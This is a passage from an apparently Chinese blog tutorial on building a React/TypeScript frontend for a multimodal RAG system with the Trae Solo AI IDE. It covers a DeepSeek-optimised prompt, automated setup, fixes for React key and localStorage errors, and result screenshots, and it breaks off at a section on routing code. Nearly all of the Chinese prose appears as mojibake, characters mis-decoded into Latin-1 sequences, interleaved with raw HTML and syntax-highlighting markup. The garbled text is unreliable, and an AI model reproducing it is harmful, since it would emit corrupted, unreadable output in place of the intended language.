è¯¥å‰ç«¯é¡¹ç›®åç§°ä¸ºå¤šæ¨¡æ€å¤§æ¨¡å‹RAGç³»ç»Ÿï¼Œç”¨æˆ·è¿›å…¥åé¦–å…ˆä¼šæœ‰ä¸€ä¸ªæ’åˆ—æ™ºèƒ½é—®ç­”ã€å›¾ç‰‡åˆ†æã€éŸ³é¢‘è½¬å†™å’ŒPDFè§£æçš„å››ä¸ªåŠŸèƒ½é€‰é¡¹ï¼Œé€‰æ‹©åŠŸèƒ½é€‰é¡¹ä¼šè¿›å…¥ä¸å¤§æ¨¡å‹çš„å¯¹è¯æ¡†ï¼Œåœ¨æ™ºèƒ½é—®ç­”é€‰é¡¹ä¸­ç”¨æˆ·å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”ã€‚åœ¨å›¾ç‰‡åˆ†æé€‰é¡¹ä¸­ç”¨æˆ·é™¤äº†å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”å¤–ï¼Œè¿˜å¯ä»¥ä¸Šä¼ å›¾ç‰‡ï¼Œå¤§æ¨¡å‹ä¾æ®å›¾ç‰‡å†…å®¹å’Œç”¨æˆ·æé—®è¿›è¡Œå›ç­”ã€‚åœ¨éŸ³é¢‘è½¬å†™é€‰é¡¹ä¸­ç”¨æˆ·é™¤äº†å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”å¤–ï¼Œè¿˜å¯ä»¥ä¸Šä¼ éŸ³é¢‘ï¼Œå¤§æ¨¡å‹ä¾æ®éŸ³é¢‘å†…å®¹å’Œç”¨æˆ·æé—®è¿›è¡Œå›ç­”ã€‚åœ¨PDFè½¬å†™é€‰é¡¹ä¸­ç”¨æˆ·é™¤äº†å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”å¤–ï¼Œè¿˜å¯ä»¥ä¸Šä¼ PDFï¼Œå¤§æ¨¡å‹ä¾æ®PDFå†…å®¹ä½œä¸ºå‚ç…§å¯¹ç”¨æˆ·æé—®è¿›è¡Œå›ç­”ï¼Œå›ç­”ä¸­è¿˜åŒ…å«å¯¹PDFçš„å¼•ç”¨ã€‚ä¸å¤§æ¨¡å‹çš„å¯¹è¯éƒ½ä»¥æµå¼è¾“å‡ºçš„æ–¹å¼è¾“å‡ºã€‚ åœ¨å‰ç«¯ç¼–å†™ä¸­ï¼Œä½ åº”è¯¥éµå¾ªå¦‚ä¸‹è§„èŒƒï¼Œç¡®ä¿å‰ç«¯ä»£ç çš„å¯ç»´æŠ¤æ€§ï¼š (1) ç»„ä»¶è®¾è®¡é‡‡ç”¨å®¹å™¨/å±•ç¤ºåˆ†ç¦»é€»è¾‘ä¸è§†å›¾ï¼Œå®¹å™¨ç»„ä»¶ï¼šç®¡ç†æ•°æ®ã€çŠ¶æ€å’Œé€»è¾‘ã€‚å±•ç¤ºç»„ä»¶ï¼šæ¥æ”¶propsæ¸²æŸ“UIï¼Œé€šå¸¸æ— çŠ¶æ€ã€‚ (2) ç›®å½•ç»“æ„æŒ‰ä¸šåŠ¡æˆ–åŠŸèƒ½æ¨¡å—ç»„ç»‡ï¼Œç»„ä»¶ä¸é¡µé¢åˆ†å¼€å­˜æ”¾ï¼Œsrc/pages/ å­˜æ”¾é¡µé¢ï¼Œsrc/components/ å­˜æ”¾å…¬å…±ç»„ä»¶ï¼Œsrc/modules/ å­˜æ”¾ä¸šåŠ¡æ¨¡å—ã€‚ (3) å¯¼å…¥å¯¼å‡ºä¿æŒå¯¼å…¥å¯¼å‡ºæ¸…æ™°ä¸€è‡´ï¼Œä¼˜å…ˆä½¿ç”¨å…·åå¯¼å‡ºï¼Œå•æ–‡ä»¶å•ç»„ä»¶ï¼šå¯ç”¨é»˜è®¤å¯¼å‡ºã€‚å•æ–‡ä»¶å¤šç»„ä»¶/å·¥å…·ï¼šå¿…é¡»ç”¨å…·åå¯¼å‡ºã€‚å¯¼å…¥é¡ºåºï¼šåº“ -&gt; ç»„ä»¶ -&gt; èµ„æº -&gt; æ ·å¼ã€‚ (4) æ ·å¼ç®¡ç†é¿å…å…¨å±€æ ·å¼æ±¡æŸ“ï¼Œç»„ä»¶æ ·å¼ç‹¬ç«‹ç®¡ç†ã€‚CSS Modules/Styled Componentsï¼šæ¨èã€‚è¦†ç›–Antdæ ·å¼ï¼šé€šè¿‡è‡ªå®šä¹‰ç±»åæˆ–ä½¿ç”¨configProviderå…¨å±€é…ç½®ã€‚ (5) è·¯ç”±ä¸é¡µé¢ä½¿ç”¨è·¯ç”±å®ç°é¡µé¢çº§ä»£ç åˆ†å‰²ï¼ŒæŒ‰éœ€åŠ è½½ã€‚é…ç½®é¡µé¢è·¯ç”±ï¼š/pages/Home/index.jsx -&gt; /homeã€‚æ‡’åŠ è½½é¡µé¢ç»„ä»¶ï¼šä½¿ç”¨ React.lazy() å’Œ Suspense â€
</code></pre>
<p><strong>DeepSeekä¼˜åŒ–åç»“æœ:</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-strong">**è§’è‰²ä¸æŠ€èƒ½å®šä½**</span>  
ä½ æ˜¯ä¸€åèµ„æ·±å‰ç«¯å·¥ç¨‹å¸ˆï¼Œç²¾é€šä»¥ä¸‹æŠ€æœ¯æ ˆï¼š

<span class="hljs-bullet">-</span>   React + TypeScript çš„ç»„ä»¶åŒ–å¼€å‘
<span class="hljs-bullet">-</span>   Tailwind CSS + Ant Design (antd) ç”¨äºç°ä»£åŒ– UI æ„å»º
<span class="hljs-bullet">-</span>   Vite è„šæ‰‹æ¶è¿›è¡Œé¡¹ç›®å¼€å‘ä¸æ„å»º

<span class="hljs-strong">**é¡¹ç›®æ¦‚è¿°**</span>  
æˆ‘å·²åœ¨Â <span class="hljs-code">`backend/src`</span>Â ä¸‹åŸºäº FastAPI å¼€å‘äº†åç«¯æœåŠ¡ï¼Œæ”¯æŒä»¥ä¸‹å››ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼š

<span class="hljs-bullet">1.</span>  å¤§æ¨¡å‹æ™ºèƒ½é—®ç­”
<span class="hljs-bullet">2.</span>  å¤§æ¨¡å‹å›¾ç‰‡åˆ†æ
<span class="hljs-bullet">3.</span>  å¤§æ¨¡å‹éŸ³é¢‘è½¬å†™
<span class="hljs-bullet">4.</span>  å¤§æ¨¡å‹ PDF é—®ç­”è§£æ

ç°éœ€è¦ä½ åŸºäºç°æœ‰åç«¯ï¼Œä½¿ç”¨Â <span class="hljs-strong">**Vite + React + TypeScript + antd + Tailwind CSS**</span>Â å¼€å‘ä¸€ä¸ªå‰ç«¯é¡¹ç›®ï¼Œé¡¹ç›®å‘½åä¸ºÂ  <span class="hljs-strong">**â€œå¤šæ¨¡æ€å¤§æ¨¡å‹RAGç³»ç»Ÿâ€**</span> ã€‚åç«¯æ ¸å¿ƒä»£ç åº”ä¿æŒä¸å˜ï¼Œå‰ç«¯é€šè¿‡è°ƒç”¨æ¥å£ä¸åç«¯äº¤äº’ã€‚

<span class="hljs-strong">**æ ¸å¿ƒåŠŸèƒ½éœ€æ±‚**</span>

<span class="hljs-bullet">1.</span>  <span class="hljs-strong">**é¦–é¡µå¯¼èˆª**</span>

<span class="hljs-bullet">    -</span>   è¿›å…¥ç³»ç»Ÿåï¼Œé¦–é¡µæ¸…æ™°å±•ç¤ºå››ä¸ªåŠŸèƒ½å…¥å£ï¼šæ™ºèƒ½é—®ç­”ã€å›¾ç‰‡åˆ†æã€éŸ³é¢‘è½¬å†™ã€PDFè§£æã€‚

<span class="hljs-bullet">2.</span>  <span class="hljs-strong">**åŠŸèƒ½é¡µé¢ä¸äº¤äº’**</span>

<span class="hljs-bullet">    -</span>   æ¯ä¸ªåŠŸèƒ½å¯¹åº”ä¸€ä¸ªç‹¬ç«‹çš„å¯¹è¯é¡µé¢ï¼Œæ”¯æŒç”¨æˆ·ä¸å¤§æ¨¡å‹è¿›è¡Œ<span class="hljs-strong">**æµå¼å¯¹è¯**</span>ï¼ˆç­”æ¡ˆé€æ­¥è¾“å‡ºï¼‰ã€‚
<span class="hljs-bullet">    -</span>   <span class="hljs-strong">**æ™ºèƒ½é—®ç­”**</span>ï¼šçº¯æ–‡æœ¬å¯¹è¯ç•Œé¢ã€‚
<span class="hljs-bullet">    -</span>   <span class="hljs-strong">**å›¾ç‰‡åˆ†æ**</span>ï¼šåœ¨å¯¹è¯åŸºç¡€ä¸Šï¼Œæ”¯æŒä¸Šä¼ å›¾ç‰‡ï¼Œæ¨¡å‹ä¾æ®å›¾ç‰‡å†…å®¹ä¸ç”¨æˆ·æé—®è¿›è¡Œå›ç­”ã€‚
<span class="hljs-bullet">    -</span>   <span class="hljs-strong">**éŸ³é¢‘è½¬å†™**</span>ï¼šåœ¨å¯¹è¯åŸºç¡€ä¸Šï¼Œæ”¯æŒä¸Šä¼ éŸ³é¢‘ï¼Œæ¨¡å‹ä¾æ®éŸ³é¢‘å†…å®¹ä¸ç”¨æˆ·æé—®è¿›è¡Œå›ç­”ã€‚
<span class="hljs-bullet">    -</span>   <span class="hljs-strong">**PDFè§£æ**</span>ï¼šåœ¨å¯¹è¯åŸºç¡€ä¸Šï¼Œæ”¯æŒä¸Šä¼ PDFï¼Œæ¨¡å‹ä»¥PDFå†…å®¹ä¸ºå‚ç…§å›ç­”é—®é¢˜ï¼Œå¹¶åœ¨ç­”æ¡ˆä¸­æä¾›å¼•ç”¨æ¥æºã€‚

<span class="hljs-strong">**å‰ç«¯ä»£ç è§„èŒƒ**</span>  
è¯·ä¸¥æ ¼æŒ‰ç…§ä»¥ä¸‹æ¶æ„ä¸è§„èŒƒè¿›è¡Œå¼€å‘ï¼š

<span class="hljs-bullet">3.</span>  <span class="hljs-strong">**ç»„ä»¶è®¾è®¡**</span>

<span class="hljs-bullet">    -</span>   é‡‡ç”¨å®¹å™¨ç»„ä»¶ï¼ˆç®¡ç†æ•°æ®ã€çŠ¶æ€ã€é€»è¾‘ï¼‰ä¸å±•ç¤ºç»„ä»¶ï¼ˆæ¥æ”¶ props æ¸²æŸ“ UIï¼‰åˆ†ç¦»çš„æ¨¡å¼ã€‚

<span class="hljs-bullet">4.</span>  <span class="hljs-strong">**ç›®å½•ç»“æ„**</span>

<span class="hljs-bullet">    -</span>   <span class="hljs-code">`src/pages/`</span>ï¼šå­˜æ”¾é¡µé¢çº§ç»„ä»¶ï¼ˆå¦‚ Home, ChatPage ç­‰ï¼‰
<span class="hljs-bullet">    -</span>   <span class="hljs-code">`src/components/`</span>ï¼šå­˜æ”¾å¯å¤ç”¨çš„å…¬å…±ç»„ä»¶
<span class="hljs-bullet">    -</span>   <span class="hljs-code">`src/modules/`</span>ï¼šæŒ‰ä¸šåŠ¡æ¨¡å—ç»„ç»‡ï¼ˆä¾‹å¦‚ï¼šchat, upload, utils ç­‰ï¼‰

<span class="hljs-bullet">5.</span>  <span class="hljs-strong">**å¯¼å…¥å¯¼å‡º**</span>

<span class="hljs-bullet">    -</span>   ä¼˜å…ˆä½¿ç”¨å…·åå¯¼å‡ºï¼›å•æ–‡ä»¶å•ç»„ä»¶å¯ä½¿ç”¨é»˜è®¤å¯¼å‡ºã€‚
<span class="hljs-bullet">    -</span>   å¯¼å…¥é¡ºåºï¼šç¬¬ä¸‰æ–¹åº“ â†’ å†…éƒ¨ç»„ä»¶ â†’ é™æ€èµ„æº â†’ æ ·å¼æ–‡ä»¶ã€‚

<span class="hljs-bullet">6.</span>  <span class="hljs-strong">**æ ·å¼ç®¡ç†**</span>

<span class="hljs-bullet">    -</span>   ä½¿ç”¨ CSS Modules æˆ– Styled Components é¿å…å…¨å±€æ ·å¼æ±¡æŸ“ã€‚
<span class="hljs-bullet">    -</span>   è¦†ç›– antd æ ·å¼æ—¶ï¼Œé€šè¿‡è‡ªå®šä¹‰ç±»åæˆ–Â <span class="hljs-code">`ConfigProvider`</span>Â å…¨å±€é…ç½®å®ç°ã€‚

<span class="hljs-bullet">7.</span>  <span class="hljs-strong">**è·¯ç”±ä¸ä»£ç åˆ†å‰²**</span>

<span class="hljs-bullet">    -</span>   é…ç½®è·¯ç”±æ˜ å°„ï¼ˆä¾‹å¦‚ï¼š<span class="hljs-code">`/pages/Home/index.tsx`</span>Â â†’Â <span class="hljs-code">`/home`</span>ï¼‰ã€‚
<span class="hljs-bullet">    -</span>   ä½¿ç”¨Â <span class="hljs-code">`React.lazy()`</span>Â ä¸Â <span class="hljs-code">`Suspense`</span>Â å®ç°é¡µé¢çº§æ‡’åŠ è½½ï¼Œæå‡æ€§èƒ½ã€‚

<span class="hljs-strong">**è¡¥å……è¦æ±‚**</span>

<span class="hljs-bullet">-</span>   æ‰€æœ‰å¯¹è¯ç•Œé¢éœ€å®ç°<span class="hljs-strong">**æµå¼è¾“å‡º**</span>ï¼ˆServer-Sent Events æˆ– WebSocketï¼‰ã€‚
<span class="hljs-bullet">-</span>   æ–‡ä»¶ä¸Šä¼ ç»„ä»¶éœ€æ”¯æŒå¸¸è§æ ¼å¼ï¼ˆå›¾ç‰‡ï¼šjpg/pngï¼›éŸ³é¢‘ï¼šmp3/wavï¼›PDFï¼špdfï¼‰ï¼Œå¹¶æä¾›ä¸Šä¼ çŠ¶æ€åé¦ˆã€‚
<span class="hljs-bullet">-</span>   ç•Œé¢é£æ ¼ä¿æŒç°ä»£ã€ç®€æ´ï¼Œç¬¦åˆ Ant Design è®¾è®¡è¯­è¨€ï¼Œå¹¶é€‚å½“è¿ç”¨ Tailwind CSS è¿›è¡Œæ ·å¼å®šåˆ¶ã€‚
</code></pre>
<p>ä¼˜åŒ–åçš„æç¤ºè¯å±‚çº§åˆ†æ˜ã€æŒ‡ä»¤æ˜ç¡®ï¼Œæ¶ˆé™¤äº†å†—ä½™å’Œæ­§ä¹‰ã€‚æ­¤æ—¶å°†å…¶æäº¤ç»™ Trae Soloï¼Œèƒ½å¤Ÿç¡®ä¿æŒ‡ä»¤è¢«æœ€é«˜æ•ˆã€æœ€å‡†ç¡®åœ°æ‰§è¡Œã€‚</p>
<h3 data-id="heading-8">2.3 Trae Solo è‡ªåŠ¨å¼€å‘</h3>
<p>ç°åœ¨ç¬”è€…å°†ä¼˜åŒ–åçš„æç¤ºè¯äº¤ç»™ Trae Soloï¼Œå¼€å§‹<strong>Trae Solo</strong>çš„è¡¨æ¼”ã€‚</p>
<ol>
<li>
<p><strong>è¾“å…¥æç¤ºè¯</strong>ï¼šå°†ä¸Šè¿°ä¼˜åŒ–åçš„æ–‡æœ¬ç²˜è´´åˆ° Trae å¯¹è¯æ¡†ä¸­</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45616db494c342b9ba54e04ecd6ef976~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=N0J5AI32c1OyRInA2DgSsRjtYGk%3D" alt="7.png" loading="lazy"/></p>
</li>
<li>
<p><strong>ç¯å¢ƒè‡ªåŠ¨æ­å»º</strong>ï¼šTrae æ¥æ”¶åˆ°æŒ‡ä»¤åï¼Œå¹¶æœªç«‹å³å¼€å§‹ç¼–ç ï¼Œè€Œæ˜¯<strong>é¦–å…ˆåˆ†æåç«¯ä»£ç ç»“æ„</strong>ï¼Œç„¶å<strong>è‡ªåŠ¨æ‰§è¡Œå‘½ä»¤è¡ŒæŒ‡ä»¤</strong>æ¥æ­å»ºå¼€å‘ç¯å¢ƒï¼ˆå¦‚åˆ›å»º Vite é¡¹ç›®ã€å®‰è£…ä¾èµ–ï¼‰ã€‚è¿™ä¸€ç‰¹æ€§æå¤§ç®€åŒ–äº†ç¯å¢ƒé…ç½®æµç¨‹ã€‚ç”¨æˆ·åœ¨ä¸­éƒ¨å¯¹è¯æ¡†çš„è¾“å…¥ï¼Œä¼šè¢«å®æ—¶è½¬åŒ–ä¸ºå³ä¾§ç»ˆç«¯çš„å‘½ä»¤æ‰§è¡Œï¼Œå®ç°äº†è‡ªç„¶è¯­è¨€é©±åŠ¨å¼€å‘ç¯å¢ƒé…ç½®ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c7c0c04f61f439ca51c6118fe77346e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=qUaO4JUSZdUmYNGOLcA7qpZfW9k%3D" alt="0.png" loading="lazy"/></p>
</li>
<li>
<p><strong>ç»“æ„åŒ–ç¼–ç </strong>ï¼šç¯å¢ƒå°±ç»ªåï¼ŒTrae å¼€å§‹æŒ‰ç…§è®¾å®šçš„è§„èŒƒç¼–å†™ä»£ç ã€‚ä»å…¶è¾“å‡ºçš„ä¸­é—´è¿‡ç¨‹å¯ä»¥çœ‹å‡ºï¼Œå®ƒæœ‰æ¡ä¸ç´Šåœ°åˆ›å»ºç›®å½•ã€ç¼–å†™ç»„ä»¶ï¼Œé€»è¾‘æ¸…æ™°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17b490febf9a469eb653fa448f96a55c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=1KrWLb2ZWNfpXUSN1LDmz1c8Lsc%3D" alt="1.png" loading="lazy"/></p>
</li>
<li>
<p><strong>ç”Ÿæˆé¡¹ç›®ç»“æ„</strong>ï¼šé¦–ç‰ˆä»£ç ç”Ÿæˆåï¼ŒæŸ¥çœ‹ç›®å½•ç»“æ„ï¼Œå®Œå…¨ç¬¦åˆä¹‹å‰çº¦å®šçš„è§„èŒƒã€‚è¯­ä¹‰åŒ–çš„æ–‡ä»¶å‘½åå’Œæ¨¡å—åŒ–ç»„ç»‡ï¼Œä½¿å¾—ä»£ç å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§å¾ˆé«˜ã€‚</p>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0a81f9ff220448593f2062044fd655b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=caqzlGFb%2FlNKFC8tXXgGL2%2BOZTs%3D" alt="8ã€.png" loading="lazy"/></p>
<h3 data-id="heading-9">2.4 Bugä¿®å¤ä¸åŠŸèƒ½æ·»åŠ </h3>
<p>å³ä¾¿æ˜¯ä¸€ä¸ªæ•°åƒè¡Œä»£ç çš„è§„èŒƒé¡¹ç›®ï¼Œ<strong>Trae Solo</strong>ä¹Ÿéš¾ä»¥ä¸€æ¬¡æ€§ç”Ÿæˆæ— bugä»£ç ã€‚æ­¤æ—¶ä¾¿éœ€è¦è¿ç”¨æŒ‡å—çš„ç¬¬ä¸‰æ­¥ï¼šç²¾å‡†çš„é—®é¢˜å®šä½ä¸å¼•å¯¼ä¿®å¤ã€‚</p>
<ol>
<li>
<p><strong>ç²¾å‡†å®šä½ä¿®å¤ Bug</strong>ï¼šä¾‹å¦‚ï¼Œåœ¨ PDF é¡µé¢é‡åˆ°äº†Â <code>Encountered two children with the same key</code>Â çš„é”™è¯¯ã€‚ä¸åº”ç®€å•ç²˜è´´æŠ¥é”™ï¼Œè€Œæ˜¯å°†<strong>é”™è¯¯ä¿¡æ¯</strong>ä¸ç–‘ä¼¼å‡ºé—®é¢˜çš„Â <strong><code>pdf.tsx</code>Â æ–‡ä»¶ä»£ç </strong>ä¸€åŒæä¾›ç»™ Traeï¼Œå¹¶å¼•å¯¼å…¶åˆ†æé—®é¢˜æ‰€åœ¨ã€‚è¿™ç§æä¾›ä¸Šä¸‹æ–‡çš„æ–¹å¼èƒ½æå¤§æé«˜ä¿®å¤æ•ˆç‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d55e102371114405a58cf8d5563f393f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=4OI%2FJi1nEp%2BbJazcx95D3PVWDoM%3D" alt="10.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68954e22d72e46b19b6092dfd73ac803~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=HPUS4QxGLUO%2BRlEZBQF1nolX%2FFE%3D" alt="9.png" loading="lazy"/></p>
</li>
<li>
<p><strong>ç¯å¢ƒç›¸å…³é”™è¯¯å¤„ç†</strong>ï¼šå¯¹äºå¦‚Â <code>localStorage is not defined</code>Â è¿™ç±»ä¸ç¯å¢ƒç›¸å…³çš„è¿è¡Œæ—¶é”™è¯¯ï¼ŒåŒæ ·é€šè¿‡æŒ‡æ˜é—®é¢˜çš„é¡µé¢å’Œä»£ç ç‰‡æ®µï¼Œå¼•å¯¼ Trae è¿›è¡Œæ¡ä»¶åˆ¤æ–­æˆ–å…¼å®¹æ€§ä¿®å¤ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7705dd2a689e460e8e0eb29ea3feac85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=jcLc9COgfiqSN%2Fs1PG4pt%2F0xgQE%3D" alt="11.png" loading="lazy"/></p>
</li>
<li>
<p><strong>åŠŸèƒ½è¿­ä»£ä¸è¡¥å……</strong>ï¼šåœ¨æ ¸å¿ƒåŠŸèƒ½æµ‹è¯•é€šè¿‡åï¼Œå‘ç°éœ€è¦è¡¥å……ä¸¤ä¸ªç‰¹æ€§ï¼š<strong>å¯¹è¯å†å²è®°å½•</strong>å’Œ<strong>PDFå¼•ç”¨å¯ç‚¹å‡»æº¯æº</strong>ã€‚å¯¹äºè¿™ç±»æ˜ç¡®çš„å°åŠŸèƒ½ç‚¹ï¼Œè¿™é‡Œç›´æ¥ç”¨è‡ªç„¶è¯­è¨€å‘ Trae æå‡ºéœ€æ±‚ï¼Œå®ƒä¼šé«˜æ•ˆåœ°å®ç°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f42e9b6744c9460c8576f437449ce216~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=y9t6sRt8vQne16vJ%2BQFyFPXER0k%3D" alt="18.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24fe2156e6ee4557a5c8fa9f92629579~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=VuW3nLGZr58WnFoucy0ClP41dIY%3D" alt="17.png" loading="lazy"/></p>
</li>
</ol>
<h3 data-id="heading-10">2.5 æœ€ç»ˆæ•ˆæœ</h3>
<p>æ‰€æœ‰å¼€å‘ä¸è°ƒè¯•å®Œæˆåï¼ŒæŒ‡ç¤º Trae æ‰§è¡ŒÂ <code>npm run dev</code>Â å¯åŠ¨å¼€å‘æœåŠ¡å™¨ï¼Œå¯¹å„åŠŸèƒ½è¿›è¡Œé€ä¸€æµ‹è¯•ã€‚</p>
<p><strong>ç³»ç»Ÿé¦–é¡µ</strong>ï¼šæ¸…æ™°å±•ç¤ºå››ä¸ªåŠŸèƒ½å…¥å£ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3378ac3d29b64491b84df6d5a359b71e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=SY8n0JSdd01TgDv%2Frn5YjkTVcvc%3D" alt="6.png" loading="lazy"/></p>
<p><strong>æ™ºèƒ½é—®ç­”ï¼š</strong> çº¯æ–‡æœ¬æµå¼å¯¹è¯ç•Œé¢ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7d193b076b04e089e4a7f572f3c42eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=%2B2NnU%2BYy0PNUpyhIRq%2FaLzaR%2FgE%3D" alt="12.png" loading="lazy"/></p>
<p><strong>å›¾ç‰‡åˆ†æï¼š</strong> æ”¯æŒä¸Šä¼ å›¾ç‰‡å¹¶ç»“åˆå›¾ç‰‡å†…å®¹è¿›è¡Œé—®ç­”ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e228ef2967343459c6dc8f68761e1fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=eeWqogGZS8SoiRA%2Bge5OatyJ524%3D" alt="13.png" loading="lazy"/></p>
<p><strong>éŸ³é¢‘è½¬å†™ï¼š</strong> æ”¯æŒä¸Šä¼ éŸ³é¢‘æ–‡ä»¶å¹¶åŸºäºå…¶å†…å®¹è¿›è¡Œäº¤äº’ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98391d9864f24faea6b9b78d3ff2d403~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=4y7rtu357gP6nFpGTcz4ejCEsCg%3D" alt="14.png" loading="lazy"/></p>
<p><strong>PDFè§£æå›ç­”ï¼š</strong> æ”¯æŒä¸Šä¼ PDFï¼Œæ¨¡å‹å›ç­”æ—¶æä¾›å¯ç‚¹å‡»çš„å¼•ç”¨æ¥æºï¼Œå®ç°æº¯æºã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f05af9af5514f79a0465e02966e0851~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=qpJpGl16wZz6uEUFki2sMTa28RI%3D" alt="15.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/169cd2885b52409185d07e6a485d4b56~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=RVdOrawHksYNb%2BMW1kD%2FuYaaqIk%3D" alt="16.png" loading="lazy"/></p>
<h2 data-id="heading-11">ä¸‰ã€å‰ç«¯å…³é”®ä»£ç è§£æ</h2>
<p>åœ¨ Trae Solo çš„åŠ©åŠ›ä¸‹ï¼Œç¬”è€…å¿«é€Ÿè·å¾—äº†ä¸€ä¸ªåŠŸèƒ½å®Œæ•´çš„å‰ç«¯é¡¹ç›®ã€‚ç°åœ¨ç¬”è€…æ·±å…¥ä»£ç å†…éƒ¨ï¼Œå®¡è§†å¤§æ¨¡å‹ç”Ÿæˆçš„å®ç°ç»†èŠ‚ï¼Œå¹¶è§£æå¤§å®¶æœ€ä¸ºå…³æ³¨çš„å‡ ä¸ªæ ¸å¿ƒè®¾è®¡ã€‚</p>
<h3 data-id="heading-12">3.1 æ¨¡å—åŒ–æ¶æ„ä¸è·¯ç”±è®¾è®¡</h3>
<p><strong>æ ¸å¿ƒè®¾è®¡</strong>ï¼šé¡¹ç›®é‡‡ç”¨äº†æ¸…æ™°çš„åˆ†å±‚ä¸æ¨¡å—åŒ–æ¶æ„ï¼Œå……åˆ†ä½“ç°äº† React çš„æœ€ä½³å®è·µã€‚</p>
<ol>
<li>
<p><strong>è·¯ç”±å±‚ (<code>Home.tsx</code>)</strong> ï¼š<br/>
